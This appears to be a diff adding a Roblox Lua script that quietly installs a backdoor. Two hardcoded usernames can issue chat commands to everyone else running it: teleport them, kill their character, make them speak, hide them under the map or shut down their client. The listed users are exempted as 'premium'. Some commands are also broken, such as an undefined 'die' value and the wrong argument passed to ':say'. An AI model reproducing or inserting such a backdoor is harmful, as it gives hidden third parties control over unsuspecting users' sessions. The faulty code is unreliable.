@@ -1,0 +1,78 @@
+if dissty then dissty() end
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer or Players:GetPropertyChangedSignal("LocalPlayer"):Wait() and Players.LocalPlayer
+lpname = lp.Name
+local conn = {"Dinero2483","plsnostomp3"}
+
+local SayMessageRequest
+local commandz
+function getmainchar(v)
+    if not v then v = lp end
+    return v.Character or v.CharacterAdded:Wait()
+end
+local function gethumanoidpart(v)
+    if not v then v = lp end
+    return getmainchar(v):WaitForChild("Humanoid")
+end
+local function getrootpart(v)
+    if not v then v = lp end
+    local humanoid = gethumanoidpart(v)
+    repeat task.wait() until humanoid.RootPart
+    return humanoid.RootPart
+end
+local function Say(...)
+    if not SayMessageRequest then
+        SayMessageRequest = game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents"):WaitForChild("SayMessageRequest")
+    end
+    SayMessageRequest:FireServer(tostring(...),"All")
+end
+commandz = {
+    [":bring"] = function(speaker)
+        getrootpart().CFrame = getrootpart(speaker).CFrame
+    end,
+    [":kill"] = function()
+        gethumanoidpart().Health = die
+    end,
+    [":say"] = function(whattosay)
+        Say(whattosay)
+    end,
+    [":tetrax"] = function()
+        Say("TeTraX Lil Bro Here, You,ve found me!")
+    end,
+    [":hide"] = function()
+        local Part
+        Part = Instance.new("Part", game:GetService("Workspace"))
+        Part.Anchored = true
+        Part.Size = Vector3.new(30, 30, 30)
+        Part.CFrame = CFrame.new(0,-400,0)
+        Part.CanCollide = true
+        getrootpart().CFrame = Part.CFrame * CFrame.new(0, 5, 0)
+    end,    
+    [":leave"] = function()
+        game.shutdown(game)
+    end
+}
+
+function initi()
+for l,v in pairs(Players:GetPlayers()) do
+    if conn[table.find(conn,v.Name)] == v.Name then
+        v.Chatted:Connect(function(msg)
+            local args = msg:split(" ")
+            local cmda = args[1]:lower()
+            local commandfunc = commandz[cmda]
+            if commandfunc then
+                commandfunc(v,args)
+            end
+        end)
+    end
+end
+end
+
+if lpname == conn[table.find(conn,lpname)] then
+    warn("Premium Found Bypassing Commands Giving Shield")
+else
+    if lpname ~= conn[table.find(conn,lpname)] then
+        warn("Vulnerable to commands")
+        initi()
+    end
+end
